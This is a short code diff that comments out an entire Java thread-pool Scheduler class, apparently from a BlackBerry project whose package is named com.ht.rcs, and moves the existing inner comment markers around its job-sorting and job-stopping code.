@@ -10,18 +10,18 @@ import com.ht.rcs.blackberry.utils.Check;
 import com.ht.rcs.blackberry.utils.Debug;
 import com.ht.rcs.blackberry.utils.DebugLevel;
 import com.ht.rcs.blackberry.utils.Utils;
-
+/*
 public class Scheduler extends Thread {
     //#debug
     static Debug debug = new Debug("Scheduler", DebugLevel.VERBOSE);
 
-    /*
+    
      * public class JobComparator implements Comparator {
      * 
      * public int compare(Object arg0, Object arg1) { long ex1 = ((Job)
      * arg0).getNextExecution(); long ex2 = ((Job) arg1).getNextExecution();
      * return (int) (ex1 - ex2); } }
-     */
+     
 
     ThreadPool threadPool;
     //SimpleSortingVector jobs = new SimpleSortingVector();
@@ -31,9 +31,9 @@ public class Scheduler extends Thread {
 
     public Scheduler(int numThreads) {
         threadPool = new ThreadPool(numThreads);
-        /*
+        
          * jobs.setSort(false); jobs.setSortComparator(new JobComparator());
-         */
+         
     }
 
     public synchronized void run() {
@@ -105,13 +105,13 @@ public class Scheduler extends Thread {
         notifyAll();
         
         threadPool.close();
-        /*synchronized (jobs) {
+        synchronized (jobs) {
 
             for (int i = 0; i < jobs.size(); i++) {
                 Job job = (Job) jobs.elementAt(i);
                 job.stop();
             }
-        }*/
+        }
     }
 
     public void add(final Job job) {
@@ -122,3 +122,4 @@ public class Scheduler extends Thread {
         }
     }
 }
+*/
